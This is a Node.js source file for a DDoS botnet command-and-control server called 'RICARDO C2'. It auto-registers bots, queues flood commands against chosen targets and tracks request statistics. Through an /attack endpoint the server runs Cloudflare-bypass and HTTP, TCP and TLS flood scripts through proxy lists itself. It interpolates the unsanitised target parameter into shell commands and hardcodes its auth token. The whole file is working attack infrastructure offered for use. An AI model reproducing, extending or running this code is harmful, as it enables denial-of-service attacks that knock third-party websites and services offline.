const express = require('express');
const { exec } = require('child_process');
const axios = require('axios');
const fs = require('fs');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');

const app = express();
app.use(express.json());

const port = process.env.PORT || 5553;
const AUTH_TOKEN = "ricardo";// Generate random token if not set

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per windowMs
});

// Apply rate limiting to API endpoints
app.use('/api/', limiter);

// Simple auth middleware
const authenticate = (req, res, next) => {
  const token = req.headers['authorization'] || req.query.token;
  if (token !== AUTH_TOKEN) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  next();
};

// Store connected bots by UNIQUE ID (name)
let connectedBots = [];          // each bot: { id, name, lastSeen, registeredAt, totalRequests?, attacksPerformed? }
let pendingCommands = {};        // key = bot.id
let stopCommands = new Set();    // set of bot.id
let blockedBots = new Set();     // set of bot.id (or name)
let attackHistory = [];

// ========== LIVE REPORTING STATS ==========
let botStats = {
  totalAttacks: 0,
  activeAttacks: 0,
  totalBots: 0,
  requestsPerSecond: 0,
  requestsPerMinute: 0,
  totalRequests: 0,
  attacksByMethod: {},
  attacksByTarget: {},
  botsByStatus: {
    online: 0,
    offline: 0,
    attacking: 0
  },
  averageResponseTime: 0,
  peakRPS: 0,
  peakRPM: 0,
  lastMinuteRequests: [],
  lastHourAttacks: []
};

// Request tracking
let requestTimestamps = [];
let minuteRequestCount = 0;
let currentMinute = new Date().getMinutes();

setInterval(() => {
  const now = Date.now();
  requestTimestamps = requestTimestamps.filter(ts => now - ts < 1000);
  botStats.requestsPerSecond = requestTimestamps.length;
  if (botStats.requestsPerSecond > botStats.peakRPS) {
    botStats.peakRPS = botStats.requestsPerSecond;
  }
}, 1000);

setInterval(() => {
  const minute = new Date().getMinutes();
  if (minute !== currentMinute) {
    botStats.requestsPerMinute = minuteRequestCount;
    if (minuteRequestCount > botStats.peakRPM) {
      botStats.peakRPM = minuteRequestCount;
    }
    botStats.lastMinuteRequests.push({
      minute: new Date().toLocaleTimeString(),
      count: minuteRequestCount
    });
    if (botStats.lastMinuteRequests.length > 60) {
      botStats.lastMinuteRequests.shift();
    }
    minuteRequestCount = 0;
    currentMinute = minute;
  }
}, 1000);

app.use((req, res, next) => {
  const start = Date.now();
  requestTimestamps.push(start);
  minuteRequestCount++;
  botStats.totalRequests++;
  res.on('finish', () => {
    const duration = Date.now() - start;
    if (botStats.averageResponseTime === 0) {
      botStats.averageResponseTime = duration;
    } else {
      botStats.averageResponseTime = (botStats.averageResponseTime * 0.9) + (duration * 0.1);
    }
  });
  next();
});

// Bot heartbeat timeout (30 seconds)
const BOT_TIMEOUT = 30000;

// Clean up inactive bots every 10 seconds
setInterval(() => {
  const now = Date.now();
  const beforeCount = connectedBots.length;
  connectedBots = connectedBots.filter(bot => {
    if (now - bot.lastSeen > BOT_TIMEOUT) {
      console.log(`[CLEANUP] Removing inactive bot: ${bot.name} (${bot.id})`);
      return false;
    }
    return true;
  });
  const online = connectedBots.filter(b => now - b.lastSeen < 10000).length;
  botStats.botsByStatus = {
    online: online,
    offline: connectedBots.length - online,
    attacking: activeAttackCount()
  };
}, 10000);

function activeAttackCount() {
  let count = 0;
  connectedBots.forEach(bot => {
    if (pendingCommands[bot.id]) count++;
  });
  return count;
}

// Method files mapping (unchanged)
const methodFiles = {
  'CF-BYPASS': 'methods/cf-bypass.js',
  'MODERN-FLOOD': 'methods/modern-flood.js',
  'HTTP-SICARIO': 'methods/REX-COSTUM.js',
  'RAW-HTTP': 'methods/h2-nust.js',
  'R9': 'methods/high-dstat.js',
  'PRIV-TOR': 'methods/w-flood1.js',
  'HOLD-PANEL': 'methods/http-panel.js',
  'R1': 'methods/vhold.js',
  'UAM': 'methods/uam.js',
  'W.I.L': 'methods/wil.js',
  'R10-TCP': 'methods/r10-tcp.js',
  'R10-TLS': 'methods/r10-tls.js',
  'R10-CONN': 'methods/r10-conn.js',
  'R10-HEADER': 'methods/r10-header.js',
  'R10-FRAG': 'methods/r10-frag.js',
  'R10-PIPE': 'methods/r10-pipe.js',
  'R10-COOKIE': 'methods/r10-cookie.js',
  'R10-MIXED': 'methods/r10-mixed.js',
  'R10-LOWCPU': 'methods/r10-lowcpu.js',
  'RAPID10': 'methods/r10-rapid.js'
};

Object.entries(methodFiles).forEach(([method, file]) => {
  if (!fs.existsSync(file)) {
    console.warn(`[WARNING] Method file not found: ${file} for ${method}`);
  }
});

async function fetchData() {
  try {
    const response = await fetch('https://httpbin.org/get');
    const data = await response.json();
    console.log('\n========================================');
    console.log('🚀 RICARDO C2 SERVER STARTED');
    console.log('========================================');
    console.log(`📍 Local:    http://localhost:${port}`);
    console.log(`📍 Network:  http://${data.origin}:${port}`);
    console.log(`🔑 Auth Token: ${AUTH_TOKEN}`);
    console.log(`📊 Live Stats: ENABLED`);
    console.log('========================================\n');
    return data;
  } catch (error) {
    console.log(`📍 Server running at http://localhost:${port}`);
    console.log(`🔑 Auth Token: ${AUTH_TOKEN}`);
    console.log(`📊 Live Stats: ENABLED`);
  }
}

// ========== REPORTING ENDPOINT (uses bot id now) ==========
app.post('/api/report', authenticate, (req, res) => {
  const { botId, target, method, requests, duration } = req.body;
  const bot = connectedBots.find(b => b.id === botId);
  if (bot) {
    bot.attacksPerformed = (bot.attacksPerformed || 0) + 1;
    bot.totalRequests = (bot.totalRequests || 0) + (requests || 0);
    bot.lastReport = Date.now();
  }
  botStats.totalRequests += requests || 0;
  botStats.attacksByMethod[method] = (botStats.attacksByMethod[method] || 0) + 1;
  botStats.attacksByTarget[target] = (botStats.attacksByTarget[target] || 0) + 1;
  console.log(`\n[REPORT] ${botId} sent ${requests || 0} requests to ${target} using ${method}`);
  res.json({ success: true });
});

app.get('/api/stats', authenticate, (req, res) => {
  const now = Date.now();
  const online = connectedBots.filter(b => now - b.lastSeen < 10000).length;
  botStats.botsByStatus = {
    online: online,
    offline: connectedBots.length - online,
    attacking: activeAttackCount()
  };
  botStats.totalBots = connectedBots.length;
  res.json(botStats);
});

// ========== REGISTRATION – now expects a unique ID and optional name ==========
app.post('/register', (req, res) => {
  let { id, name, url } = req.body;   // id is mandatory, name optional, url optional (legacy)
  if (!id) {
    // If no id given but url exists, we use url as ID (backward compat)
    if (url) id = url;
    else return res.status(400).json({ error: 'Bot unique id required' });
  }

  if (blockedBots.has(id)) {
    console.log(`[BLOCKED] Bot tried to register: ${id}`);
    return res.status(403).json({ error: 'Bot is blocked', approved: false });
  }

  const existing = connectedBots.find(bot => bot.id === id);
  if (existing) {
    existing.lastSeen = Date.now();
    return res.json({ message: 'Bot already registered', approved: true, bot: existing });
  }

  // Generate a friendly name if not provided
  const botName = name || `agent-${id.slice(-6)}`;
  const newBot = {
    id,
    name: botName,
    lastSeen: Date.now(),
    registeredAt: new Date().toLocaleString(),
    attacksPerformed: 0,
    totalRequests: 0
  };
  connectedBots.push(newBot);
  botStats.totalBots = connectedBots.length;
  console.log(`[AUTO-APPROVED] New bot registered: ${botName} (${id})`);
  res.json({ message: 'Bot auto-approved', approved: true, bot: newBot });
});

// ========== COMMAND POLLING – uses bot id ==========
app.get('/get-command', (req, res) => {
  const { botId } = req.query;
  if (!botId) return res.status(400).json({ error: 'Bot ID required' });

  const bot = connectedBots.find(b => b.id === botId);
  if (bot) bot.lastSeen = Date.now();

  if (stopCommands.has(botId)) {
    stopCommands.delete(botId);
    return res.json({ hasCommand: true, command: { action: 'stop' } });
  }

  if (pendingCommands[botId]) {
    const command = pendingCommands[botId];
    delete pendingCommands[botId];
    return res.json({ hasCommand: true, command: { action: 'attack', ...command } });
  }

  res.json({ hasCommand: false });
});

// ========== ADMIN ENDPOINTS (use bot id instead of url) ==========
app.get('/bots', authenticate, (req, res) => {
  // Return list with id, name, lastSeen, etc.
  const botsForUI = connectedBots.map(b => ({
    id: b.id,
    name: b.name,
    lastSeen: b.lastSeen,
    registeredAt: b.registeredAt,
    attacksPerformed: b.attacksPerformed || 0,
    totalRequests: b.totalRequests || 0
  }));
  res.json({ bots: botsForUI });
});

app.get('/attack-bot', authenticate, async (req, res) => {
  const { botId, target, time, methods } = req.query;
  if (!botId || !target || !time || !methods) {
    return res.json({ success: false, error: 'Missing parameters (botId, target, time, methods)' });
  }

  const timeNum = parseInt(time);
  if (isNaN(timeNum) || timeNum < 1 || timeNum > 3600) {
    return res.json({ success: false, error: 'Invalid time (1-3600 seconds)' });
  }

  const bot = connectedBots.find(b => b.id === botId);
  if (!bot) {
    return res.json({ success: false, error: 'Bot not found' });
  }

  pendingCommands[botId] = { target, time: timeNum, methods, timestamp: Date.now() };

  botStats.totalAttacks++;
  botStats.activeAttacks++;
  botStats.attacksByMethod[methods] = (botStats.attacksByMethod[methods] || 0) + 1;

  console.log(`[CMD] Attack queued for bot ${bot.name} (${botId}): ${methods} → ${target} for ${timeNum}s`);
  res.json({ success: true, message: `Command sent to ${bot.name}` });
});

app.get('/stop-bot', authenticate, async (req, res) => {
  const { botId } = req.query;
  if (!botId) return res.json({ success: false, error: 'Bot ID required' });

  delete pendingCommands[botId];
  stopCommands.add(botId);
  res.json({ success: true, message: 'Stop command sent' });
});

app.get('/stop-all', authenticate, async (req, res) => {
  pendingCommands = {};
  connectedBots.forEach(bot => stopCommands.add(bot.id));
  botStats.activeAttacks = 0;
  res.json({ success: true, message: `Stop queued for ${connectedBots.length} bots` });
});

app.get('/block-bot', authenticate, (req, res) => {
  const { botId } = req.query;
  if (!botId) return res.json({ success: false, error: 'Bot ID required' });

  blockedBots.add(botId);
  connectedBots = connectedBots.filter(b => b.id !== botId);
  delete pendingCommands[botId];
  stopCommands.delete(botId);
  botStats.totalBots = connectedBots.length;

  console.log(`[BLOCK] Bot ${botId} permanently blocked`);
  res.json({ success: true, message: 'Bot blocked', botId });
});

app.get('/unblock-bot', authenticate, (req, res) => {
  const { botId } = req.query;
  if (!botId) return res.json({ success: false, error: 'Bot ID required' });
  blockedBots.delete(botId);
  res.json({ success: true, message: 'Bot unblocked', botId });
});

app.get('/blocked', authenticate, (req, res) => {
  res.json({ blocked: Array.from(blockedBots) });
});

// ========== SERVER-SIDE ATTACK (unchanged) ==========
app.get('/attack', authenticate, (req, res) => {
  const { target, time, methods } = req.query;
  if (!target || !time || !methods) return res.status(400).json({ error: 'Missing required parameters' });

  const timeNum = parseInt(time);
  if (isNaN(timeNum) || timeNum < 1 || timeNum > 3600) {
    return res.status(400).json({ error: 'Invalid time (1-3600 seconds)' });
  }

  const methodFile = methodFiles[methods];
  if (!methodFile || !fs.existsSync(methodFile)) {
    return res.status(400).json({ error: `Method file not found for ${methods}` });
  }

  console.log(`\n[SERVER-ATTACK] ${methods} -> ${target} for ${timeNum}s`);
  attackHistory.push({ target, time: timeNum, method: methods, timestamp: Date.now() });
  botStats.totalAttacks++;
  botStats.activeAttacks++;
  botStats.attacksByMethod[methods] = (botStats.attacksByMethod[methods] || 0) + 1;
  botStats.attacksByTarget[target] = (botStats.attacksByTarget[target] || 0) + 1;

  res.status(200).json({ message: 'Server attack launched', target, time: timeNum, methods });

  const execWithLog = (cmd) => {
    exec(cmd, (error, stdout, stderr) => {
      if (error) {
        console.error(`[ERROR] ${error.message}`);
        botStats.activeAttacks = Math.max(0, botStats.activeAttacks - 1);
        return;
      }
      if (stdout) {
        const lines = stdout.split('\n');
        const requestLines = lines.filter(l => l.includes('Request') || l.includes('GET') || l.includes('POST')).length;
        if (requestLines > 0) botStats.totalRequests += requestLines;
        console.log(`[OUTPUT] ${stdout}`);
      }
      if (stderr) console.error(`[STDERR] ${stderr}`);
    });
  };

  // Attack execution (same as original)
  switch(methods) {
    case 'CF-BYPASS':
      execWithLog(`node methods/cf-bypass.js ${target} ${timeNum} 4 32 proxy.txt`); break;
    case 'MODERN-FLOOD':
      execWithLog(`node methods/modern-flood.js ${target} ${timeNum} 4 64 proxy.txt`); break;
    case 'HTTP-SICARIO':
      execWithLog(`node methods/REX-COSTUM.js ${target} ${timeNum} 32 6 proxy.txt --randrate --full --legit --query 1`);
      execWithLog(`node methods/cibi.js ${target} ${timeNum} 16 3 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${timeNum} 32 2 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${timeNum} 12 4 proxy.txt`);
      break;
    case 'RAW-HTTP':
      execWithLog(`node methods/h2-nust ${target} ${timeNum} 15 2 proxy.txt`);
      execWithLog(`node methods/http-panel.js ${target} ${timeNum}`);
      break;
    case 'R9':
      execWithLog(`node methods/high-dstat.js ${target} ${timeNum} 32 7 proxy.txt`);
      execWithLog(`node methods/w-flood1.js ${target} ${timeNum} 8 3 proxy.txt`);
      execWithLog(`node methods/vhold.js ${target} ${timeNum} 16 2 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${timeNum} 16 2 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${timeNum} 8 1 proxy.txt`);
      break;
    case 'PRIV-TOR':
      execWithLog(`node methods/w-flood1.js ${target} ${timeNum} 64 6 proxy.txt`);
      execWithLog(`node methods/high-dstat.js ${target} ${timeNum} 16 2 proxy.txt`);
      execWithLog(`node methods/cibi.js ${target} ${timeNum} 12 4 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${timeNum} 10 4 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${timeNum} 10 1 proxy.txt`);
      break;
    case 'HOLD-PANEL':
      execWithLog(`node methods/http-panel.js ${target} ${timeNum}`);
      break;
    case 'R1':
      execWithLog(`node methods/vhold.js ${target} ${timeNum} 15 2 proxy.txt`);
      execWithLog(`node methods/high-dstat.js ${target} ${timeNum} 64 2 proxy.txt`);
      execWithLog(`node methods/cibi.js ${target} ${timeNum} 4 2 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${timeNum} 16 2 proxy.txt`);
      execWithLog(`node methods/REX-COSTUM.js ${target} ${timeNum} 32 6 proxy.txt --randrate --full --legit --query 1`);
      execWithLog(`node methods/w-flood1.js ${target} ${timeNum} 8 3 proxy.txt`);
      execWithLog(`node methods/vhold.js ${target} ${timeNum} 16 2 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${timeNum} 32 3 proxy.txt`);
      break;
    case 'RAPID10':
      execWithLog(`node methods/r10-rapid.js ${target} ${timeNum} 10000`);
      execWithLog(`node methods/r10-tcp.js ${target} ${timeNum}`);
      execWithLog(`node methods/r10-tls.js ${target} ${timeNum}`);
      execWithLog(`node methods/r10-conn.js ${target} ${timeNum}`);
      execWithLog(`node methods/r10-header.js ${target} ${timeNum} 5000`);
      execWithLog(`node methods/r10-frag.js ${target} ${timeNum}`);
      execWithLog(`node methods/r10-pipe.js ${target} ${timeNum}`);
      execWithLog(`node methods/r10-cookie.js ${target} ${timeNum}`);
      execWithLog(`node methods/r10-mixed.js ${target} ${timeNum}`);
      execWithLog(`node methods/r10-lowcpu.js ${target} ${timeNum} 1000`);
      break;
    case 'UAM':
      execWithLog(`node methods/uam.js ${target} ${timeNum} 5 4 6`);
      break;
    case 'W.I.L':
      execWithLog(`node methods/wil.js ${target} ${timeNum} 10 8 4`);
      break;
    default:
      console.error(`[ERROR] Unknown method: ${methods}`);
      botStats.activeAttacks = Math.max(0, botStats.activeAttacks - 1);
  }

  setTimeout(() => {
    botStats.activeAttacks = Math.max(0, botStats.activeAttacks - 1);
  }, timeNum * 1000);
});

// Simple ping
app.get('/ping', (req, res) => res.json({ alive: true, timestamp: Date.now(), uptime: process.uptime() }));

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('[SERVER ERROR]', err.stack);
  res.status(500).json({ error: 'Internal server error' });
});

// Start server
app.listen(port, () => {
  fetchData();
  if (!fs.existsSync('./methods')) fs.mkdirSync('./methods');
  if (!fs.existsSync('./proxy.txt')) fs.writeFileSync('./proxy.txt', '# Add your proxies here\n# Format: ip:port\n');
  console.log('\n📁 Required:');
  console.log('   - /methods/ - place attack scripts here');
  console.log('   - proxy.txt - one proxy per line');
  console.log('🤖 Bots are now identified by UNIQUE NAMES/IDs (not IPs)');
  console.log('📡 Client index.js must send {"id":"unique-id","name":"optional-name"} to /register\n');
});
